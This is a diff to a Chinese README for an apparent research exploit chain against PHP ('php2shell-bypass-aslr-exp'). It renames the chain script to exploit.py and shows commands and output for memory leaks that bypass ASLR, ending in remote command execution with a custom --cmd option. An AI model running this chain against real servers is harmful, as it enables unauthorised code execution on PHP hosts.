@@ -29,7 +29,7 @@ cd php2shell-bypass-aslr-exp
 # memory_limit => 128M => 128M
 
 # 2) 一条命令：A1 -> B1 泄漏 -> A2 -> B2 -> id
-python3 pure/pwn_pure.py --port 18110
+python3 exploit.py --port 18110
 # [try 1] A1: END-cleanup send_cookie OOM
 # [try 1] B1: stale-id OOB read (chunk base + libphp)
 #       decoded=819208 zval_ptr_dtor=0x7fe00ef5db60 -> libphp=0x7fe00e8ff000
@@ -51,11 +51,11 @@ Linux 上没有 docker 组权限时脚本会自动改用 `sudo docker`，也可�
 
 ```bash
 # 换新 ASLR 复测（重启容器）
-python3 pure/pwn_pure.py --port 18110 --restart p2s-pure-18110
+python3 exploit.py --port 18110 --restart p2s-pure-18110
 
 # 自定义命令：把脚本写进挂载目录，再用 sh 执行
 printf 'id; uname -a > /out/p1\n' > out/c
-python3 pure/pwn_pure.py --port 18110 --cmd 'sh</out/c'
+python3 exploit.py --port 18110 --cmd 'sh</out/c'
 ```
 
 `--retries` 默认 3；如果某次越界窗口里最常见的指针不是
@@ -102,7 +102,7 @@ ASLR 每次容器启动会变，链上两次泄漏会自己算出来。
 ## 证据
 
 - 机制与标定：[pure/RESEARCH_PURE_128M.md](pure/RESEARCH_PURE_128M.md)
-- 全链脚本：[pure/pwn_pure.py](pure/pwn_pure.py)
+- 全链脚本：[exploit.py](exploit.py)（`pure/pwn_pure.py` 保留为别名）
 - 调试镜像批量日志：[pure/evidence/pwn_pure_batch_20261022.log](pure/evidence/pwn_pure_batch_20261022.log)
 - 官方镜像日志：[pure/evidence/pwn_pure_official_20261022.log](pure/evidence/pwn_pure_official_20261022.log)
 - proof：[pure/evidence/pwn_pure_proof_p1.txt](pure/evidence/pwn_pure_proof_p1.txt)
@@ -111,9 +111,10 @@ ASLR 每次容器启动会变，链上两次泄漏会自己算出来。
 
 早期提交里的 `exploit.py` 走的是**自定义** `docker/php.ini`
 （`display_errors=On`、`memory_limit=8M`、`max_input_vars=1000`），
-与本 README 的官方配置目标无关，保留仅为历史/机制参考；相关文档
-[HTTP_HEAP_LEAK.md](HTTP_HEAP_LEAK.md)、[ASLR_PURE_HTTP.md](ASLR_PURE_HTTP.md)、
-[DISPLAY_ERRORS_OFF.md](DISPLAY_ERRORS_OFF.md) 描述的是那一线。
+与本 README 的官方配置目标无关，已归档到
+[archive/legacy-8m/exploit.py](archive/legacy-8m/exploit.py)；
+同目录下的 [HTTP_HEAP_LEAK.md](archive/legacy-8m/HTTP_HEAP_LEAK.md)、
+[ASLR_PURE_HTTP.md](archive/legacy-8m/ASLR_PURE_HTTP.md) 等描述的是那一线。
 
 ## 复现声明
 
